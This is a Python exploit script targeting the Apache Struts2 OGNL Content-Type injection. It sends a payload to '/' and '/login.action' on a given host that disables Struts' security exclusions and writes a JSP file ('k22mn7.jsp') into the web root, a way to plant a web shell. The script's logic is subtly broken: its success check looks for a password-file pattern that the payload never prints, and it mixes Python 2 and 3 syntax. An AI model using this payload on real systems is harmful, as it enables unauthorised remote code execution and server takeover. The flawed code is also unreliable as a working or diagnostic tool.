import re
import requests
import sys
import os

if len(sys.argv) < 3:
        print 'Usage: python %s <dst_ip> <port>' % os.path.basename(sys.argv[0])
        sys.exit()
        
address =(sys.argv[1], sys.argv[2])
dst_addr=":".join(address)
print(dst_addr)

vuln_list =("/", "/login.action")

URL="http://"+dst_addr
for i in vuln_list:
        print(URL+i)
        headers ={"Content-Type": "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#fs=new java.io.FileOutputStream(#req.getSession().getServletContext().getRealPath('/k22mn7.jsp'))).(#out=#res.getOutputStream()).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),#fs)).(#fs.close()).(#out.print('upload_')).(#out.print('ok/')).(#out.print(#req.getContextPath())).(#out.close())}"}
        res = requests.get(URL+i, headers=headers)
        response = res.text

        p = re.compile('.*:x:\d')
        m = p.match(response)
        print("Status Code : %d"% res.status_code)
        if m:
                print("Vuln Found")
        else:
                print("Not Found")
